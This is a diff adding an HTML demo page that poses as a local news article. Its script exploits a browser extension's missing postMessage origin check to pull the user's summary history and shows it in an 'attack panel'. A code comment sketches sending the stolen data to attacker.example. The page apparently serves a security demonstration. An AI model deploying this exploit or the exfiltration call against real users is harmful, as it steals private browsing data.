@@ -1,0 +1,177 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Totally Legit News Site</title>
+    <style>
+      body {
+        font-family: Georgia, serif;
+        max-width: 720px;
+        margin: 40px auto;
+        padding: 0 20px;
+        color: #222;
+      }
+      h1 { font-size: 2em; margin-bottom: 4px; }
+      .byline { color: #777; font-size: 13px; margin-bottom: 24px; }
+      p { line-height: 1.7; }
+      hr { margin: 32px 0; border: none; border-top: 1px solid #ddd; }
+
+      /* Attack UI — shown only after data is captured */
+      #attack-panel {
+        display: none;
+        position: fixed;
+        top: 20px;
+        right: 20px;
+        width: 360px;
+        background: #1e1e1e;
+        color: #d4f7a0;
+        font-family: monospace;
+        font-size: 12px;
+        border: 2px solid #f00;
+        border-radius: 6px;
+        padding: 14px;
+        z-index: 9999;
+        max-height: 80vh;
+        overflow-y: auto;
+      }
+      #attack-panel h3 {
+        margin: 0 0 10px;
+        color: #f66;
+        font-size: 14px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+      }
+      #attack-output { white-space: pre-wrap; word-break: break-word; }
+      #close-panel {
+        margin-top: 10px;
+        background: #333;
+        color: #fff;
+        border: 1px solid #666;
+        padding: 4px 10px;
+        cursor: pointer;
+        border-radius: 3px;
+        font-size: 11px;
+      }
+
+      #trigger-btn {
+        background: #0055cc;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        font-size: 14px;
+        border-radius: 4px;
+        cursor: pointer;
+        margin-top: 16px;
+      }
+      #trigger-btn:disabled { background: #999; cursor: default; }
+      #attack-status { font-size: 13px; color: #555; margin-top: 8px; }
+    </style>
+  </head>
+  <body>
+
+    <h1>Breaking: Local Tech Conference Returns Next Month</h1>
+    <div class="byline">By Staff Reporter &bull; April 22, 2026</div>
+
+    <p>
+      The annual regional technology conference is set to return next month after
+      a two-year hiatus, organizers announced Tuesday. The event will feature
+      keynote speakers from several major software companies and a series of
+      workshops on emerging topics in cybersecurity and artificial intelligence.
+    </p>
+    <p>
+      Tickets are expected to sell quickly. Early registration opens this Friday
+      at 9 a.m. and attendees who register before May 1 receive a 20% discount.
+      Full details are available on the official conference website.
+    </p>
+    <p>
+      "We are thrilled to bring the community back together," said conference
+      director Alex Morales. "This year's program is our most ambitious yet."
+    </p>
+
+    <hr>
+
+    <!-- Demo trigger — visible to the presenter during the live demo -->
+    <p style="font-size:13px;color:#888;">
+      [Demo control — not visible to a real user visiting this site]
+    </p>
+    <button id="trigger-btn">Run Attack 1: Steal Extension History</button>
+    <div id="attack-status"></div>
+
+    <!-- Exfiltrated data panel -->
+    <div id="attack-panel">
+      <h3>Stolen Extension History</h3>
+      <div id="attack-output"></div>
+      <button id="close-panel">Close</button>
+    </div>
+
+    <script>
+      /*
+       * ATTACK 1 DEMO
+       *
+       * The vulnerable extension's content.js listens to window.postMessage
+       * with no origin check. We send a GET_HISTORY request; it forwards the
+       * request to the background service worker, which returns the full
+       * summary history, and content.js posts it back to "*" — including us.
+       *
+       * In a real attack this script would run silently on page load and POST
+       * the data to an external server. Here we display it visibly for the demo.
+       */
+
+      const STATUS = document.getElementById("attack-status");
+      const PANEL  = document.getElementById("attack-panel");
+      const OUTPUT = document.getElementById("attack-output");
+
+      function onMessage(event) {
+        if (!event.data || event.data.type !== "HISTORY_RESPONSE") return;
+
+        window.removeEventListener("message", onMessage);
+        clearTimeout(timeoutId);
+
+        const history = event.data.history || [];
+
+        if (!history.length) {
+          STATUS.textContent = "Attack succeeded — history was empty (generate some summaries first).";
+          return;
+        }
+
+        // Show the stolen data
+        OUTPUT.textContent = JSON.stringify(history, null, 2);
+        PANEL.style.display = "block";
+        STATUS.textContent = `Attack succeeded — ${history.length} history entr${history.length === 1 ? "y" : "ies"} stolen.`;
+
+        /*
+         * In a real attack you would exfiltrate here, e.g.:
+         *   fetch("https://attacker.example/collect", {
+         *     method: "POST",
+         *     body: JSON.stringify(history)
+         *   });
+         */
+      }
+
+      let timeoutId;
+
+      document.getElementById("trigger-btn").addEventListener("click", () => {
+        const btn = document.getElementById("trigger-btn");
+        btn.disabled = true;
+        STATUS.textContent = "Sending postMessage to extension content script…";
+
+        window.addEventListener("message", onMessage);
+
+        // Fire the malicious request — content.js has no origin check so it responds
+        window.postMessage({ type: "GET_HISTORY" }, "*");
+
+        // Timeout in case the vulnerable extension is not loaded
+        timeoutId = setTimeout(() => {
+          window.removeEventListener("message", onMessage);
+          STATUS.textContent =
+            "No response. Make sure the VULNERABLE extension is loaded and active on this tab.";
+          btn.disabled = false;
+        }, 3000);
+      });
+
+      document.getElementById("close-panel").addEventListener("click", () => {
+        PANEL.style.display = "none";
+      });
+    </script>
+  </body>
+</html>
